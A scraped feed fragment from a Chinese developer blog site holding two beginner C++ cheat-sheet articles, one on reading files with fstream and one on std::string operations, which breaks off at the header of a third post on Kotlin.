.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>干了这么多年C++开发，每次遇到文件读取还得去问AI，真是惭愧！今天我决定把这些基础的文件操作函数背下来，整理成这份速记指南。</p>
</blockquote>
<p>在C++中，文件操作主要依赖于 <code>&lt;fstream&gt;</code> 头文件中的类。掌握文件读取是C++编程中的基础技能之一。</p>
<hr/>
<h2 data-id="heading-0">必须掌握的类和头文件</h2>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span>   <span class="hljs-comment">// 主要头文件</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span>  <span class="hljs-comment">// 用于输出信息</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span>    <span class="hljs-comment">// 用于读取整行文本</span></span>
</code></pre>
<h3 data-id="heading-1">三类文件流：</h3>
<ul>
<li><code>ifstream</code>：读取文件（输入流）</li>
<li><code>ofstream</code>：写入文件（输出流）</li>
<li><code>fstream</code>：读写文件（双向流）</li>
</ul>
<hr/>
<h2 data-id="heading-2">必须掌握的函数</h2>
<h3 data-id="heading-3">1. 打开文件</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* filename, ios::openmode mode)</span></span>;
</code></pre>
<p>示例：</p>
<pre><code class="hljs language-cpp" lang="cpp">ifstream fin;
fin.<span class="hljs-built_in">open</span>(<span class="hljs-string">"data.txt"</span>);
</code></pre>
<h3 data-id="heading-4">2. 判断文件是否打开成功</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">is_open</span><span class="hljs-params">()</span></span>;
</code></pre>
<p>示例：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">if</span> (!fin.<span class="hljs-built_in">is_open</span>()) {
    cerr &lt;&lt; <span class="hljs-string">"打开文件失败！"</span> &lt;&lt; endl;
}
</code></pre>
<h3 data-id="heading-5">3. 关闭文件</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">close</span><span class="hljs-params">()</span></span>;
</code></pre>
<p>示例：</p>
<pre><code class="hljs language-cpp" lang="cpp">fin.<span class="hljs-built_in">close</span>();
</code></pre>
<h3 data-id="heading-6">4. 读取文件内容</h3>
<h4 data-id="heading-7">逐行读取（最常用）</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-built_in">getline</span>(fin, line); <span class="hljs-comment">// line 是 string 类型</span>
</code></pre>
<p>示例：</p>
<pre><code class="hljs language-cpp" lang="cpp">string line;
<span class="hljs-keyword">while</span> (<span class="hljs-built_in">getline</span>(fin, line)) {
    cout &lt;&lt; line &lt;&lt; endl;
}
</code></pre>
<h4 data-id="heading-8">按空格分隔读取（适合读取数字或单词）</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-type">int</span> num;
<span class="hljs-keyword">while</span> (fin &gt;&gt; num) {
    cout &lt;&lt; num &lt;&lt; endl;
}
</code></pre>
<h4 data-id="heading-9">逐字符读取</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-type">char</span> ch;
<span class="hljs-keyword">while</span> (fin.<span class="hljs-built_in">get</span>(ch)) {
    cout &lt;&lt; ch;
}
</code></pre>
<h3 data-id="heading-10">5. 判断是否读取到文件末尾</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">eof</span><span class="hljs-params">()</span></span>;
</code></pre>
<p>示例：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">while</span> (!fin.<span class="hljs-built_in">eof</span>()) {
    <span class="hljs-built_in">getline</span>(fin, line);
    cout &lt;&lt; line &lt;&lt; endl;
}
</code></pre>
<hr/>
<h2 data-id="heading-11">使用建议</h2>
<ul>
<li>推荐优先使用 <code>ifstream</code> 读取文本文件</li>
<li>读取文本内容时，<code>getline()</code> 是最常用的方法</li>
<li>使用完文件后务必调用 <code>close()</code>，避免资源泄露</li>
<li>文件路径建议使用绝对路径或确保文件存在于程序运行目录中</li>
</ul>
<hr/>
<h2 data-id="heading-12">完整示例：读取文本文件并逐行输出</h2>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">ifstream <span class="hljs-title">fin</span><span class="hljs-params">(<span class="hljs-string">"example.txt"</span>)</span></span>;
    <span class="hljs-keyword">if</span> (!fin.<span class="hljs-built_in">is_open</span>()) {
        cerr &lt;&lt; <span class="hljs-string">"无法打开文件！"</span> &lt;&lt; endl;
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }

    string line;
    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">getline</span>(fin, line)) {
        cout &lt;&lt; line &lt;&lt; endl;
    }

    fin.<span class="hljs-built_in">close</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<hr/>
<h2 data-id="heading-13">速记口诀</h2>
<blockquote>
<p>读文件，用 <code>ifstream</code>；<br/>
打开前，先判断；<br/>
读内容，<code>getline</code> 好；<br/>
结束后，记得 <code>close</code>！</p>
</blockquote>
<p>下次再遇到文件读取，直接看这份笔记就行，不用再到处问AI了！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【C++必知必会】字符串操作速记]]></title>    <link>https://juejin.cn/post/7576026767372173331</link>    <guid>https://juejin.cn/post/7576026767372173331</guid>    <pubDate>2025-11-24T11:09:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576026767372173331" data-draft-id="7576098886860161067" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【C++必知必会】字符串操作速记"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T11:09:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码事漫谈"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【C++必知必会】字符串操作速记
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码事漫谈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T11:09:36.000Z" title="Mon Nov 24 2025 11:09:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>干了这么多年C++，每次处理字符串还得查文档，真是说不过去！今天我决定把这些常用的字符串操作函数背下来，整理成这份速记指南。</p>
</blockquote>
<p>在C++中，字符串操作主要依赖于 <code>&lt;string&gt;</code> 头文件。掌握字符串处理是C++编程中的核心技能之一。</p>
<hr/>
<h2 data-id="heading-0">必须掌握的头文件</h2>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span>    <span class="hljs-comment">// 主要头文件</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span>  <span class="hljs-comment">// 用于输入输出</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sstream&gt;</span>   <span class="hljs-comment">// 字符串流处理</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span> <span class="hljs-comment">// 用于字符串算法</span></span>
</code></pre>
<hr/>
<h2 data-id="heading-1">必须掌握的字符串操作</h2>
<h3 data-id="heading-2">1. 字符串创建和初始化</h3>
<pre><code class="hljs language-cpp" lang="cpp">string str1;                    <span class="hljs-comment">// 空字符串</span>
string str2 = <span class="hljs-string">"Hello"</span>;         <span class="hljs-comment">// 直接初始化</span>
<span class="hljs-function">string <span class="hljs-title">str3</span><span class="hljs-params">(<span class="hljs-string">"World"</span>)</span></span>;          <span class="hljs-comment">// 构造函数初始化</span>
<span class="hljs-function">string <span class="hljs-title">str4</span><span class="hljs-params">(<span class="hljs-number">5</span>, <span class="hljs-string">'A'</span>)</span></span>;           <span class="hljs-comment">// "AAAAA"</span>
string str5 = str2 + <span class="hljs-string">" "</span> + str3; <span class="hljs-comment">// 字符串拼接</span>
</code></pre>
<h3 data-id="heading-3">2. 获取字符串信息</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-type">int</span> len = str.<span class="hljs-built_in">length</span>();        <span class="hljs-comment">// 字符串长度</span>
<span class="hljs-type">int</span> size = str.<span class="hljs-built_in">size</span>();         <span class="hljs-comment">// 同length()</span>
<span class="hljs-type">bool</span> empty = str.<span class="hljs-built_in">empty</span>();      <span class="hljs-comment">// 是否为空</span>
</code></pre>
<h3 data-id="heading-4">3. 访问字符串内容</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-type">char</span> first = str[<span class="hljs-number">0</span>];           <span class="hljs-comment">// 通过下标访问</span>
<span class="hljs-type">char</span> first_safe = str.<span class="hljs-built_in">at</span>(<span class="hljs-number">0</span>);   <span class="hljs-comment">// 安全访问，会检查边界</span>
<span class="hljs-type">char</span> last = str.<span class="hljs-built_in">back</span>();        <span class="hljs-comment">// 最后一个字符</span>
<span class="hljs-type">char</span> first_char = str.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">// 第一个字符</span>
</code></pre>
<h3 data-id="heading-5">4. 字符串查找</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-type">size_t</span> pos = str.<span class="hljs-built_in">find</span>(<span class="hljs-string">"hello"</span>);    <span class="hljs-comment">// 查找子串</span>
<span class="hljs-type">size_t</span> rpos = str.<span class="hljs-built_in">rfind</span>(<span class="hljs-string">"hello"</span>);  <span class="hljs-comment">// 从后往前查找</span>
<span class="hljs-type">size_t</span> found = str.<span class="hljs-built_in">find_first_of</span>(<span class="hljs-string">"aeiou"</span>);  <span class="hljs-comment">// 查找任意匹配字符</span>
<span class="hljs-type">size_t</span> notfound = str.<span class="hljs-built_in">find_first_not_of</span>(<span class="hljs-string">"0123456789"</span>); <span class="hljs-comment">// 查找非数字字符</span>
</code></pre>
<h3 data-id="heading-6">5. 字符串修改</h3>
<pre><code class="hljs language-cpp" lang="cpp">str.<span class="hljs-built_in">append</span>(<span class="hljs-string">" World"</span>);          <span class="hljs-comment">// 追加字符串</span>
str.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">'!'</span>);            <span class="hljs-comment">// 追加单个字符</span>
str.<span class="hljs-built_in">insert</span>(<span class="hljs-number">5</span>, <span class="hljs-string">" Beautiful"</span>);   <span class="hljs-comment">// 在指定位置插入</span>
str.<span class="hljs-built_in">erase</span>(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>);              <span class="hljs-comment">// 删除从位置5开始的10个字符</span>
str.<span class="hljs-built_in">replace</span>(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-string">"Hi"</span>);       <span class="hljs-comment">// 替换从位置0开始的5个字符</span>
</code></pre>
<h3 data-id="heading-7">6. 字符串比较</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-type">bool</span> equal = (str1 == str2);   <span class="hljs-comment">// 直接比较</span>
<span class="hljs-type">int</span> result = str1.<span class="hljs-built_in">compare</span>(str2); <span class="hljs-comment">// 返回0表示相等，&lt;0表示str1小，&gt;0表示str1大</span>
<span class="hljs-type">bool</span> starts = str.<span class="hljs-built_in">starts_with</span>(<span class="hljs-string">"Hello"</span>); <span class="hljs-comment">// C++20 检查前缀</span>
<span class="hljs-type">bool</span> ends = str.<span class="hljs-built_in">ends_with</span>(<span class="hljs-string">"World"</span>);     <span class="hljs-comment">// C++20 检查后缀</span>
</code></pre>
<h3 data-id="heading-8">7. 子串操作</h3>
<pre><code class="hljs language-cpp" lang="cpp">string sub = str.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>);     <span class="hljs-comment">// 从位置0开始取5个字符</span>
string sub2 = str.<span class="hljs-built_in">substr</span>(<span class="hljs-number">6</span>);       <span class="hljs-comment">// 从位置6开始到结尾</span>
</code></pre>
<h3 data-id="heading-9">8. 字符串转换</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 数字转字符串</span>
string num_str = <span class="hljs-built_in">to_string</span>(<span class="hljs-number">123</span>);

<span class="hljs-comment">// 字符串转数字</span>
<span class="hljs-type">int</span> num = <span class="hljs-built_in">stoi</span>(<span class="hljs-string">"456"</span>);
<span class="hljs-type">double</span> d = <span class="hljs-built_in">stod</span>(<span class="hljs-string">"3.14"</span>);
<span class="hljs-type">long</span> l = <span class="hljs-built_in">stol</span>(<span class="hljs-string">"1000000"</span>);

<span class="hljs-comment">// 大小写转换</span>
<span class="hljs-built_in">transform</span>(str.<span class="hljs-built_in">begin</span>(), str.<span class="hljs-built_in">end</span>(), str.<span class="hljs-built_in">begin</span>(), ::tolower);
<span class="hljs-built_in">transform</span>(str.<span class="hljs-built_in">begin</span>(), str.<span class="hljs-built_in">end</span>(), str.<span class="hljs-built_in">begin</span>(), ::toupper);
</code></pre>
<h3 data-id="heading-10">9. 字符串流处理</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 字符串分割</span>
<span class="hljs-function">stringstream <span class="hljs-title">ss</span><span class="hljs-params">(<span class="hljs-string">"apple,banana,orange"</span>)</span></span>;
string item;
<span class="hljs-keyword">while</span> (<span class="hljs-built_in">getline</span>(ss, item, <span class="hljs-string">','</span>)) {
    cout &lt;&lt; item &lt;&lt; endl;
}

<span class="hljs-comment">// 格式化字符串</span>
stringstream ss2;
ss2 &lt;&lt; <span class="hljs-string">"Name: "</span> &lt;&lt; name &lt;&lt; <span class="hljs-string">", Age: "</span> &lt;&lt; age;
string result = ss2.<span class="hljs-built_in">str</span>();
</code></pre>
<h3 data-id="heading-11">10. 字符串清理和修剪</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 去除前后空格（自定义函数）</span>
<span class="hljs-function">string <span class="hljs-title">trim</span><span class="hljs-params">(<span class="hljs-type">const</span> string&amp; str)</span> </span>{
    <span class="hljs-type">size_t</span> start = str.<span class="hljs-built_in">find_first_not_of</span>(<span class="hljs-string">" \t\n\r"</span>);
    <span class="hljs-type">size_t</span> end = str.<span class="hljs-built_in">find_last_not_of</span>(<span class="hljs-string">" \t\n\r"</span>);
    <span class="hljs-keyword">return</span> (start == string::npos) ? <span class="hljs-string">""</span> : str.<span class="hljs-built_in">substr</span>(start, end - start + <span class="hljs-number">1</span>);
}
</code></pre>
<hr/>
<h2 data-id="heading-12">常用模式速记</h2>
<h3 data-id="heading-13">1. 字符串分割</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">split</span><span class="hljs-params">(<span class="hljs-type">const</span> string&amp; str, <span class="hljs-type">char</span> delimiter)</span> </span>{
    vector&lt;string&gt; tokens;
    <span class="hljs-function">stringstream <span class="hljs-title">ss</span><span class="hljs-params">(str)</span></span>;
    string token;
    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">getline</span>(ss, token, delimiter)) {
        tokens.<span class="hljs-built_in">push_back</span>(token);
    }
    <span class="hljs-keyword">return</span> tokens;
}
</code></pre>
<h3 data-id="heading-14">2. 字符串替换</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">string <span class="hljs-title">replace_all</span><span class="hljs-params">(string str, <span class="hljs-type">const</span> string&amp; from, <span class="hljs-type">const</span> string&amp; to)</span> </span>{
    <span class="hljs-type">size_t</span> start_pos = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">while</span> ((start_pos = str.<span class="hljs-built_in">find</span>(from, start_pos)) != string::npos) {
        str.<span class="hljs-built_in">replace</span>(start_pos, from.<span class="hljs-built_in">length</span>(), to);
        start_pos += to.<span class="hljs-built_in">length</span>();
    }
    <span class="hljs-keyword">return</span> str;
}
</code></pre>
<h3 data-id="heading-15">3. 检查字符串内容</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">is_number</span><span class="hljs-params">(<span class="hljs-type">const</span> string&amp; str)</span> </span>{
    <span class="hljs-keyword">return</span> !str.<span class="hljs-built_in">empty</span>() &amp;&amp; <span class="hljs-built_in">all_of</span>(str.<span class="hljs-built_in">begin</span>(), str.<span class="hljs-built_in">end</span>(), ::isdigit);
}

<span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">contains</span><span class="hljs-params">(<span class="hljs-type">const</span> string&amp; str, <span class="hljs-type">const</span> string&amp; substring)</span> </span>{
    <span class="hljs-keyword">return</span> str.<span class="hljs-built_in">find</span>(substring) != string::npos;
}
</code></pre>
<hr/>
<h2 data-id="heading-16">完整示例：综合字符串操作</h2>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sstream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// 创建和初始化</span>
    string text = <span class="hljs-string">"Hello World, Welcome to C++ Programming!"</span>;
    
    <span class="hljs-comment">// 基本信息</span>
    cout &lt;&lt; <span class="hljs-string">"长度: "</span> &lt;&lt; text.<span class="hljs-built_in">length</span>() &lt;&lt; endl;
    cout &lt;&lt; <span class="hljs-string">"是否为空: "</span> &lt;&lt; text.<span class="hljs-built_in">empty</span>() &lt;&lt; endl;
    
    <span class="hljs-comment">// 查找</span>
    <span class="hljs-type">size_t</span> pos = text.<span class="hljs-built_in">find</span>(<span class="hljs-string">"C++"</span>);
    <span class="hljs-keyword">if</span> (pos != string::npos) {
        cout &lt;&lt; <span class="hljs-string">"找到C++在位置: "</span> &lt;&lt; pos &lt;&lt; endl;
    }
    
    <span class="hljs-comment">// 修改</span>
    text.<span class="hljs-built_in">replace</span>(pos, <span class="hljs-number">3</span>, <span class="hljs-string">"Python"</span>);
    cout &lt;&lt; <span class="hljs-string">"替换后: "</span> &lt;&lt; text &lt;&lt; endl;
    
    <span class="hljs-comment">// 大小写转换</span>
    <span class="hljs-built_in">transform</span>(text.<span class="hljs-built_in">begin</span>(), text.<span class="hljs-built_in">end</span>(), text.<span class="hljs-built_in">begin</span>(), ::tolower);
    cout &lt;&lt; <span class="hljs-string">"小写: "</span> &lt;&lt; text &lt;&lt; endl;
    
    <span class="hljs-comment">// 字符串分割</span>
    string data = <span class="hljs-string">"apple,banana,orange,grape"</span>;
    <span class="hljs-function">stringstream <span class="hljs-title">ss</span><span class="hljs-params">(data)</span></span>;
    string fruit;
    cout &lt;&lt; <span class="hljs-string">"水果列表: "</span>;
    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">getline</span>(ss, fruit, <span class="hljs-string">','</span>)) {
        cout &lt;&lt; fruit &lt;&lt; <span class="hljs-string">" "</span>;
    }
    cout &lt;&lt; endl;
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<hr/>
<h2 data-id="heading-17">速记口诀</h2>
<blockquote>
<p>字符串，<code>&lt;string&gt;</code> 头；<br/>
创建拼接最常用；<br/>
查找用 <code>find</code>，替换用 <code>replace</code>；<br/>
流处理，分割强；<br/>
大小写，<code>transform</code>！</p>
</blockquote>
<hr/>
<p>下次再遇到字符串处理，直接看这份笔记就行，不用再到处查文档了！记住：多练习才是掌握的关键。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[kotlin-5]]></title>    <link>https://juejin.cn/post/7575897635137814528</link>    <guid>https://juejin.cn/post/7575897635137814528</guid>    <pubDate>2025-11-24T11:51:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575897635137814528" data-draft-id="7571278865516298290" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kotlin-5"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-11-24T11:51:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="风冷"/> <meta itemprop="url" content="https://juejin.cn/user/3843548379091742"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kotlin-5
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3843548379091742/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    风冷
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T11:51:51.000Z" title="Mon Nov 24 2025 11:51:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
